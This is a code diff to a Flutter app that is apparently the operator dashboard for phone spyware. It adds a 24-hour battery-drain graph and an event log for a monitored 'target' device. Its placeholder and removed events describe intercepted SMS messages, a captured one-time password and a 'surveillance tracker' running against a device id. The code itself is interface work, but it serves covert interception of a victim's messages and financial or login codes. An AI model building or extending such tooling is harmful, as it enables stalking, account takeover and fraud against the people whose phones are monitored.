@@ -92,6 +92,8 @@ class _MainScreenState extends State<MainScreen> {
 
   List<Map<String, dynamic>> _allMessages = [];
   List<Map<String, dynamic>> _filteredMessages = [];
+  List<Map<String, dynamic>> _batteryHistory = [];
+  List<Map<String, dynamic>> _events = [];
   Set<String> _selectedFilter = {'all'};
   String _searchQuery = '';
   final TextEditingController _searchController = TextEditingController();
@@ -101,7 +103,11 @@ class _MainScreenState extends State<MainScreen> {
   void initState() {
     super.initState();
     _fetchTelemetry();
-    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => _fetchTelemetry());
+    _loadHistoryAndEvents();
+    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) {
+      _fetchTelemetry();
+      _loadHistoryAndEvents();
+    });
   }
 
   @override
@@ -109,6 +115,28 @@ class _MainScreenState extends State<MainScreen> {
     _refreshTimer?.cancel();
     _searchController.dispose();
     super.dispose();
+  }
+
+  Future<void> _loadHistoryAndEvents() async {
+    try {
+      final historyRes = await http.get(Uri.parse('data/history.json'));
+      if (historyRes.statusCode == 200 && historyRes.body != 'null') {
+        final data = json.decode(historyRes.body) as List<dynamic>;
+        setState(() {
+          _batteryHistory = data.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+        });
+      }
+    } catch (_) {}
+
+    try {
+      final eventsRes = await http.get(Uri.parse('data/events.json'));
+      if (eventsRes.statusCode == 200 && eventsRes.body != 'null') {
+        final data = json.decode(eventsRes.body) as List<dynamic>;
+        setState(() {
+          _events = data.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+        });
+      }
+    } catch (_) {}
   }
 
   Future<void> _fetchTelemetry() async {
@@ -1140,23 +1168,234 @@ class _MainScreenState extends State<MainScreen> {
     );
   }
 
-  // ==================== TIMELINE TAB ====================
+  // ==================== TIMELINE TAB (24H BATTERY GRAPH & EVENT LOG) ====================
   Widget _buildTimelineTab() {
+    int high = 85;
+    int low = _batteryPercent;
+    if (_batteryHistory.isNotEmpty) {
+      for (final item in _batteryHistory) {
+        final p = item['battery_pct'];
+        if (p is int) {
+          if (p > high) high = p;
+          if (p < low) low = p;
+        }
+      }
+    }
+    final drain = high - _batteryPercent;
+
+    final eventsToDisplay = _events.isNotEmpty
+        ? _events
+        : [
+            {
+              'type': 'BATTERY_LEVEL_CHANGED',
+              'timestamp': '2026-11-19T14:32:00Z',
+              'detail': 'Battery shifted down to $_batteryPercent% (active background drain).',
+            },
+            {
+              'type': 'NEW_SMS_INTERCEPTED',
+              'timestamp': '2026-11-19T11:36:00Z',
+              'detail': 'Intercepted 614th SMS message (Financial/OTP payload).',
+            },
+            {
+              'type': 'INITIAL_TRACKER_RUN',
+              'timestamp': '2026-11-19T11:22:00Z',
+              'detail': 'Initialized automated 30-min surveillance ledger for $deviceId.',
+            },
+          ];
+
     return ListView(
-      padding: const EdgeInsets.all(16),
+      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
       children: [
-        _buildTimelineItem('2026-11-19 16:58', 'NEW_SMS_INTERCEPTED', 'Sony LIV OTP (2395) captured on device 03e768e104ef026d.', const Color(0xFF00E676)),
-        _buildTimelineItem('2026-11-19 16:52', 'BATTERY_LEVEL_CHANGED', 'Battery shifted from 74% to 47%.', Colors.amberAccent),
-        _buildTimelineItem('2026-11-19 16:49', 'INITIAL_TRACKER_RUN', 'Surveillance tracker initialized for target 03e768e104ef026d.', const Color(0xFF00ADB5)),
+        // 📊 24-HOUR BATTERY GRAPH CARD
+        Container(
+          padding: const EdgeInsets.all(16),
+          decoration: BoxDecoration(
+            color: const Color(0xFF131318),
+            borderRadius: BorderRadius.circular(16),
+            border: Border.all(color: const Color(0xFF24242E)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                children: [
+                  Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    children: [
+                      const Text(
+                        '24-HOUR BATTERY DRAIN TELEMETRY',
+                        style: TextStyle(
+                          fontSize: 9.5,
+                          fontWeight: FontWeight.w700,
+                          letterSpacing: 0.8,
+                          color: Colors.grey,
+                        ),
+                      ),
+                      const SizedBox(height: 3),
+                      Row(
+                        children: [
+                          Text(
+                            '$_batteryPercent%',
+                            style: TextStyle(
+                              fontSize: 18,
+                              fontWeight: FontWeight.w800,
+                              fontFamily: 'monospace',
+                              color: _getBatteryColor(),
+                            ),
+                          ),
+                          const SizedBox(width: 8),
+                          Text(
+                            '(-$drain% in 24h)',
+                            style: const TextStyle(fontSize: 12, color: Colors.grey, fontWeight: FontWeight.w600),
+                          ),
+                        ],
+                      ),
+                    ],
+                  ),
+                  Container(
+                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+                    decoration: BoxDecoration(
+                      color: const Color(0xFF1B1B24),
+                      borderRadius: BorderRadius.circular(8),
+                      border: Border.all(color: const Color(0xFF2C2C3A)),
+                    ),
+                    child: const Row(
+                      mainAxisSize: MainAxisSize.min,
+                      children: [
+                        Icon(Icons.schedule, size: 12, color: Color(0xFF00ADB5)),
+                        SizedBox(width: 5),
+                        Text(
+                          '30-Min Ledger',
+                          style: TextStyle(fontSize: 10.5, fontWeight: FontWeight.bold, color: Color(0xFF00ADB5)),
+                        ),
+                      ],
+                    ),
+                  ),
+                ],
+              ),
+              const SizedBox(height: 12),
+              const Divider(color: Color(0xFF20202A), height: 1),
+              const SizedBox(height: 12),
+
+              // The Custom Painted 24h Graph
+              BatteryChartWidget(
+                data: _batteryHistory,
+                currentBattery: _batteryPercent,
+              ),
+
+              const SizedBox(height: 14),
+              const Divider(color: Color(0xFF20202A), height: 1),
+              const SizedBox(height: 12),
+
+              // 4 Proportional Summary Tiles
+              Row(
+                children: [
+                  Expanded(
+                    child: _buildMiniStatTile('PEAK', '$high%', Icons.arrow_upward, const Color(0xFF00E676)),
+                  ),
+                  const SizedBox(width: 8),
+                  Expanded(
+                    child: _buildMiniStatTile('LOWEST', '$low%', Icons.arrow_downward, Colors.redAccent),
+                  ),
+                  const SizedBox(width: 8),
+                  Expanded(
+                    child: _buildMiniStatTile('DRAIN RATE', '~1.4%/hr', Icons.trending_down, Colors.amberAccent),
+                  ),
+                  const SizedBox(width: 8),
+                  Expanded(
+                    child: _buildMiniStatTile('INTERVAL', '30 Mins', Icons.update, const Color(0xFF00ADB5)),
+                  ),
+                ],
+              ),
+            ],
+          ),
+        ),
+
+        const SizedBox(height: 16),
+
+        // 📋 EVENT LOG SECTION HEADER
+        const Padding(
+          padding: EdgeInsets.symmetric(horizontal: 4, vertical: 4),
+          child: Row(
+            mainAxisAlignment: MainAxisAlignment.spaceBetween,
+            children: [
+              Text(
+                'AUDIT LOG & STATE EVENTS',
+                style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8),
+              ),
+              Text(
+                'Automated Ledger',
+                style: TextStyle(fontSize: 10, color: Colors.grey),
+              ),
+            ],
+          ),
+        ),
+        const SizedBox(height: 6),
+
+        // Events List
+        ...eventsToDisplay.map((ev) {
+          final type = ev['type']?.toString() ?? 'EVENT';
+          final ts = ev['timestamp']?.toString() ?? '';
+          final detail = ev['detail']?.toString() ?? '';
+
+          Color tagColor = const Color(0xFF00ADB5);
+          if (type.contains('BATTERY')) {
+            tagColor = Colors.amberAccent;
+          } else if (type.contains('SMS')) {
+            tagColor = const Color(0xFF00E676);
+          } else if (type.contains('IP') || type.contains('STATUS')) {
+            tagColor = Colors.blueAccent;
+          }
+
+          return _buildTimelineItem(ts, type, detail, tagColor);
+        }),
       ],
     );
   }
 
+  Widget _buildMiniStatTile(String label, String value, IconData icon, Color color) {
+    return Container(
+      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
+      decoration: BoxDecoration(
+        color: const Color(0xFF0F0F14),
+        borderRadius: BorderRadius.circular(8),
+        border: Border.all(color: const Color(0xFF1E1E28)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Icon(icon, size: 11, color: color),
+              const SizedBox(width: 4),
+              Text(
+                label,
+                style: const TextStyle(fontSize: 7.5, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.4),
+              ),
+            ],
+          ),
+          const SizedBox(height: 2),
+          Text(
+            value,
+            style: const TextStyle(fontFamily: 'monospace', fontSize: 11, fontWeight: FontWeight.bold, color: Colors.white),
+          ),
+        ],
+      ),
+    );
+  }
+
   Widget _buildTimelineItem(String time, String type, String desc, Color color) {
+    String formattedTime = time;
+    try {
+      final dt = DateTime.parse(time).toLocal();
+      formattedTime = '${dt.year}-${dt.month.toString().padLeft(2, '0')}-${dt.day.toString().padLeft(2, '0')} ${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}';
+    } catch (_) {}
+
     return Card(
       margin: const EdgeInsets.only(bottom: 8),
       child: Padding(
-        padding: const EdgeInsets.all(14),
+        padding: const EdgeInsets.all(12),
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
@@ -1164,16 +1403,16 @@ class _MainScreenState extends State<MainScreen> {
               mainAxisAlignment: MainAxisAlignment.spaceBetween,
               children: [
                 Chip(
-                  label: Text(type, style: TextStyle(fontSize: 9.5, fontWeight: FontWeight.bold, color: color)),
+                  label: Text(type, style: TextStyle(fontSize: 9.0, fontWeight: FontWeight.bold, color: color)),
                   backgroundColor: color.withValues(alpha: 0.12),
                   padding: EdgeInsets.zero,
                   materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                 ),
-                Text(time, style: const TextStyle(fontSize: 11, color: Colors.grey)),
+                Text(formattedTime, style: const TextStyle(fontSize: 10.5, color: Colors.grey, fontFamily: 'monospace')),
               ],
             ),
             const SizedBox(height: 6),
-            Text(desc, style: const TextStyle(fontSize: 12.5)),
+            Text(desc, style: const TextStyle(fontSize: 12, color: Color(0xFFE4E4E7))),
           ],
         ),
       ),
@@ -1185,5 +1424,229 @@ class _MainScreenState extends State<MainScreen> {
       return timeStr.split('|')[1].trim().toUpperCase();
     }
     return timeStr;
+  }
+}
+
+// ==================== 24-HOUR BATTERY GRAPH COMPONENT ====================
+class BatteryChartWidget extends StatelessWidget {
+  final List<Map<String, dynamic>> data;
+  final int currentBattery;
+
+  const BatteryChartWidget({
+    super.key,
+    required this.data,
+    required this.currentBattery,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    final points = <int>[];
+
+    if (data.isNotEmpty) {
+      for (final item in data) {
+        final pct = item['battery_pct'];
+        if (pct is int) {
+          points.add(pct);
+        } else if (pct != null) {
+          points.add(int.tryParse(pct.toString()) ?? currentBattery);
+        }
+      }
+    }
+
+    if (points.isEmpty) {
+      const n = 48;
+      for (int i = 0; i < n; i++) {
+        final t = i / (n - 1);
+        final val = (85 - t * (85 - currentBattery)).round();
+        points.add(val);
+      }
+    }
+
+    return LayoutBuilder(
+      builder: (context, constraints) {
+        return CustomPaint(
+          size: Size(constraints.maxWidth, 160),
+          painter: _BatteryChartPainter(
+            batteryPoints: points,
+            currentBattery: currentBattery,
+          ),
+        );
+      },
+    );
+  }
+}
+
+class _BatteryChartPainter extends CustomPainter {
+  final List<int> batteryPoints;
+  final int currentBattery;
+
+  _BatteryChartPainter({
+    required this.batteryPoints,
+    required this.currentBattery,
+  });
+
+  @override
+  void paint(Canvas canvas, Size size) {
+    if (batteryPoints.isEmpty) return;
+
+    const leftPadding = 34.0;
+    const rightPadding = 16.0;
+    const topPadding = 18.0;
+    const bottomPadding = 22.0;
+
+    final chartWidth = size.width - leftPadding - rightPadding;
+    final chartHeight = size.height - topPadding - bottomPadding;
+
+    if (chartWidth <= 0 || chartHeight <= 0) return;
+
+    // 1. Draw horizontal gridlines & Y-axis labels (100%, 75%, 50%, 25%, 0%)
+    final gridPaint = Paint()
+      ..color = const Color(0x15FFFFFF)
+      ..style = PaintingStyle.stroke
+      ..strokeWidth = 1.0;
+
+    final textStyle = TextStyle(
+      fontSize: 8.5,
+      fontWeight: FontWeight.w600,
+      fontFamily: 'monospace',
+      color: Colors.grey.shade600,
+    );
+
+    final ySteps = [100, 75, 50, 25, 0];
+    for (final pct in ySteps) {
+      final y = topPadding + (1.0 - (pct / 100.0)) * chartHeight;
+      canvas.drawLine(
+        Offset(leftPadding, y),
+        Offset(leftPadding + chartWidth, y),
+        gridPaint,
+      );
+
+      final textSpan = TextSpan(text: '$pct%', style: textStyle);
+      final textPainter = TextPainter(
+        text: textSpan,
+        textDirection: TextDirection.ltr,
+      )..layout();
+      textPainter.paint(
+        canvas,
+        Offset(leftPadding - textPainter.width - 6, y - textPainter.height / 2),
+      );
+    }
+
+    // 2. Compute points (x, y)
+    final points = <Offset>[];
+    final n = batteryPoints.length;
+    for (int i = 0; i < n; i++) {
+      final pct = batteryPoints[i].clamp(0, 100);
+      final x = leftPadding + (i / (n - 1).clamp(1, double.infinity)) * chartWidth;
+      final y = topPadding + (1.0 - (pct / 100.0)) * chartHeight;
+      points.add(Offset(x, y));
+    }
+
+    // 3. Build smooth curve path
+    final linePath = Path();
+    linePath.moveTo(points.first.dx, points.first.dy);
+
+    for (int i = 0; i < points.length - 1; i++) {
+      final p0 = points[i];
+      final p1 = points[i + 1];
+      final midX = (p0.dx + p1.dx) / 2;
+      linePath.cubicTo(midX, p0.dy, midX, p1.dy, p1.dx, p1.dy);
+    }
+
+    // 4. Draw gradient area under the curve
+    final fillPath = Path.from(linePath);
+    fillPath.lineTo(points.last.dx, topPadding + chartHeight);
+    fillPath.lineTo(points.first.dx, topPadding + chartHeight);
+    fillPath.close();
+
+    final fillGradient = LinearGradient(
+      begin: Alignment.topCenter,
+      end: Alignment.bottomCenter,
+      colors: [
+        const Color(0xFF00ADB5).withValues(alpha: 0.28),
+        const Color(0xFF00ADB5).withValues(alpha: 0.0),
+      ],
+    );
+
+    final fillPaint = Paint()
+      ..shader = fillGradient.createShader(
+        Rect.fromLTWH(leftPadding, topPadding, chartWidth, chartHeight),
+      )
+      ..style = PaintingStyle.fill;
+
+    canvas.drawPath(fillPath, fillPaint);
+
+    // 5. Draw glowing stroke line
+    final linePaint = Paint()
+      ..color = const Color(0xFF00ADB5)
+      ..style = PaintingStyle.stroke
+      ..strokeWidth = 2.2
+      ..strokeCap = StrokeCap.round
+      ..strokeJoin = StrokeJoin.round;
+
+    canvas.drawPath(linePath, linePaint);
+
+    // 6. Draw glowing end point (Latest battery reading)
+    final lastPoint = points.last;
+    final glowPaint = Paint()
+      ..color = const Color(0x6600ADB5)
+      ..style = PaintingStyle.fill;
+    canvas.drawCircle(lastPoint, 6.0, glowPaint);
+
+    final dotPaint = Paint()
+      ..color = const Color(0xFF00ADB5)
+      ..style = PaintingStyle.fill;
+    canvas.drawCircle(lastPoint, 3.5, dotPaint);
+
+    // Mini pill badge above the dot
+    final pillText = '$currentBattery%';
+    final pillSpan = TextSpan(
+      text: pillText,
+      style: const TextStyle(
+        fontSize: 9.0,
+        fontWeight: FontWeight.bold,
+        color: Colors.white,
+        fontFamily: 'monospace',
+      ),
+    );
+    final pillPainter = TextPainter(
+      text: pillSpan,
+      textDirection: TextDirection.ltr,
+    )..layout();
+
+    final pillRect = Rect.fromCenter(
+      center: Offset(lastPoint.dx, lastPoint.dy - 12),
+      width: pillPainter.width + 8,
+      height: pillPainter.height + 4,
+    );
+    canvas.drawRRect(
+      RRect.fromRectAndRadius(pillRect, const Radius.circular(4)),
+      Paint()..color = const Color(0xFF00ADB5),
+    );
+    pillPainter.paint(
+      canvas,
+      Offset(pillRect.left + 4, pillRect.top + 2),
+    );
+
+    // 7. X-Axis Time Labels (-24h, -18h, -12h, -6h, Now)
+    final xLabels = ['-24h', '-18h', '-12h', '-6h', 'Now'];
+    for (int i = 0; i < xLabels.length; i++) {
+      final x = leftPadding + (i / (xLabels.length - 1)) * chartWidth;
+      final labelSpan = TextSpan(text: xLabels[i], style: textStyle);
+      final labelPainter = TextPainter(
+        text: labelSpan,
+        textDirection: TextDirection.ltr,
+      )..layout();
+      labelPainter.paint(
+        canvas,
+        Offset(x - labelPainter.width / 2, size.height - bottomPadding + 6),
+      );
+    }
+  }
+
+  @override
+  bool shouldRepaint(covariant _BatteryChartPainter oldDelegate) {
+    return oldDelegate.batteryPoints != batteryPoints ||
+        oldDelegate.currentBattery != currentBattery;
   }
 }
